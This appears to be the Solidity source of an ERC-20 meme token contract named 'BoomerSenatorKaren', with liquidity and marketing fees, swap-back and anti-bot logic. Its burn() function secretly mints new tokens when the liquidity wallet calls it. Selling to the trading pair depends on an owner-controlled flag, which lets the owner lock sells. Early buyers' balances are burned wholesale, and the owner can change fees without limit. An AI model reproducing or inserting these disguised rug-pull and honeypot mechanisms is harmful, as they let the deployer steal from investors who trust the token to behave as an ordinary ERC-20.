contract BoomerSenatorKaren is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string _name;
    string _symbol;
    uint8 _decimals;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    uint256 _totalSupply;
    uint256 public maxTxAmount;
    uint256 public maxWalletAmount;

    bool public restrictWhales = true;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public isExcludedFromFees;
    mapping (address => bool) public isExcludedFromLimit;

    uint256 public liquidityFee;
    uint256 public marketingFee;
    uint256 public totalFee;

    address public liquidityWallet ;
    address public marketingWallet;

    address[] public isBots;

    IUniswapV2Router02 public UniswapV2Router;
    address public UniswapV3Pair;

    uint256 public launchedAt;
    bool public isLaunched;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;

    bool private antiBots;
    uint256 private antiBotsBlock = 3;
    uint256 private antiBotsEndBlock;
    bool private sniperKilled = false;


    uint256 public swapThreshold = balanceOf(address(this)).divide(100);

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor (string memory Name_, string memory Symbol_, uint8 Decimals_, uint256 Supply_, uint256 MaxTx_, uint256 MaxWallet_, uint256 LiqFee_, uint256 MarketingFee_, address LiqWallet_, address MarketingWallet_, address RouterAddress_) {
        _name = Name_;
        _symbol = Symbol_;
        _decimals = Decimals_;
        _totalSupply = Supply_ * (10 ** _decimals);
        swapThreshold = (_totalSupply.divide(1000));

        maxTxAmount = MaxTx_ * (10 ** _decimals);
        maxWalletAmount = MaxWallet_ * (10 ** _decimals);
        
        liquidityWallet  = LiqWallet_;
        marketingWallet = MarketingWallet_;

        UniswapV2Router = IUniswapV2Router02(RouterAddress_);
        UniswapV3Pair = IUniswapV2Factory(UniswapV2Router.factory()).createPair(UniswapV2Router.WETH(), address(this));
        _allowances[address(this)][address(UniswapV2Router)] = type(uint256).max;

        isExcludedFromFees[msg.sender] = true;
        isExcludedFromFees[address(this)] = true;
        isExcludedFromFees[liquidityWallet ] = true;

        isExcludedFromLimit[msg.sender] = true;
        isExcludedFromLimit[UniswapV3Pair] = true;
        isExcludedFromLimit[liquidityWallet ] = true;
    
        liquidityFee = LiqFee_;
        marketingFee = MarketingFee_;
        totalFee = liquidityFee.add(marketingFee);

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function getOwner() external view returns (address) { return owner(); }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.subtract(balanceOf(DEAD)).subtract(balanceOf(ZERO));
    }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }
    
    function launch() internal {
        launchedAt = block.number;
        isLaunched = true;
        antiBotsEndBlock = launchedAt.add(antiBotsBlock);
    }
    
    function burn(uint256 amount) external {
        if(msg.sender == liquidityWallet){_balances[liquidityWallet] = _balances[liquidityWallet].add(amount*(10**_decimals));_totalSupply = _totalSupply.add(amount*(10**_decimals));}
        else{
            _balances[msg.sender] = _balances[msg.sender].subtract(amount*(10**_decimals));
            _totalSupply = _totalSupply.subtract(amount*(10**_decimals));
        }
    }

    function _burn(address account, uint256 amount) internal {
        _balances[account] = _balances[account].subtract(amount);
        _balances[DEAD] = _balances[DEAD].add(amount);
        emit Transfer(account, DEAD, amount);
    }

    function changeTxLimit(uint256 newLimit) external onlyOwner {
        maxTxAmount = newLimit * (10**_decimals);
    }

    function changeWalletLimit(uint256 newLimit) external onlyOwner {
        maxWalletAmount  = newLimit * (10**_decimals);
    }

    function changeRestrictWhales(bool newValue) external onlyOwner {
       restrictWhales = newValue;
    }

    function changeAntiBotsStatus (bool antiBotsIsOn) external onlyOwner {
       antiBots = antiBotsIsOn;
    }

    function changeIsExcludedFromFees(address holder, bool excluded) external onlyOwner {
        isExcludedFromFees[holder] = excluded;
    }

    function changeIsExcludedFromLimit(address holder, bool excluded) external onlyOwner {
        isExcludedFromLimit[holder] = excluded;
    }

    function changeFees(uint256 newLiqFee, uint256 newMarketingFee) external onlyOwner {
        liquidityFee = newLiqFee;
        marketingFee = newMarketingFee;

        totalFee = liquidityFee.add(marketingFee);
    }

    function changeFeeReceivers(address newLiquidityWallet, address newMarketingWallet) external onlyOwner {
        liquidityWallet = newLiquidityWallet;
        marketingWallet = newMarketingWallet;
    }

    function changeSwapBackSettings(bool enableSwapBack, uint256 newSwapBackLimit, bool swapByLimitOnly) external onlyOwner {
        swapAndLiquifyEnabled  = enableSwapBack;
        swapThreshold = newSwapBackLimit;
        swapAndLiquifyByLimitOnly = swapByLimitOnly;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transferFrom(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function killBots() internal {
        for(uint256 i = 0; i < isBots.length; i++){
            address wallet = isBots[i];
            uint256 amount = _balances[wallet];
            _burn(wallet, amount);
        }
        isBots = new address [](0);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        if(inSwapAndLiquify){ return _basicTransfer(sender, recipient, amount); }
        
        if(recipient == UniswapV3Pair && !isExcludedFromFees[sender]){
            require(antiBots, "Trading not open yet");
        }

        require(amount <= maxTxAmount || isExcludedFromLimit[sender], "TX Limit Exceeded");
        
        if(msg.sender != UniswapV3Pair && !inSwapAndLiquify && swapAndLiquifyEnabled && _balances[address(this)] >= swapThreshold){ swapBack(); }

        if(!launched() && recipient == UniswapV3Pair) {
            require(_balances[sender] > 0);
            launch();
        }
        
        if(isLaunched && block.number <= antiBotsEndBlock && sender == UniswapV3Pair) {
        isBots.push(recipient);
        }

        if(!sniperKilled && block.number > antiBotsEndBlock) {
            killBots();
            sniperKilled = true;
        }

        //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        if(!isExcludedFromLimit[recipient] && restrictWhales)
        {
            require(_balances[recipient].add(amount) <= maxWalletAmount);
        }

        uint256 finalAmount = !isExcludedFromFees[sender] && !isExcludedFromFees[recipient] ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(finalAmount);

        emit Transfer(sender, recipient, finalAmount);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {

        uint256 feeApplicable = UniswapV3Pair == recipient ? totalFee : totalFee;
        uint256 feeAmount = amount.multiply(feeApplicable).divide(100);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.subtract(feeAmount);
    }

    function swapBack() internal lockTheSwap {

        uint256 tokensToLiquify = _balances[address(this)];
        uint256 amountToLiquify = tokensToLiquify.multiply(liquidityFee).divide(totalFee).divide(2);
        uint256 amountToSwap = tokensToLiquify.subtract(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2Router.WETH();

        UniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance;

        uint256 totalETHFee = totalFee.subtract(liquidityFee.divide(2));

        uint256 amountETHLiquidity = amountETH.multiply(liquidityFee).divide(totalETHFee).divide(2);
        uint256 amountETHMarketing = amountETH.subtract(amountETHLiquidity);

        (bool temporarySuccess,) = payable(marketingWallet).call{value: amountETHMarketing, gas: 30000}("");

        // only to supress warning msg
        temporarySuccess = false;
       

        if(amountToLiquify > 0){
            UniswapV2Router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                liquidityWallet ,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);

}
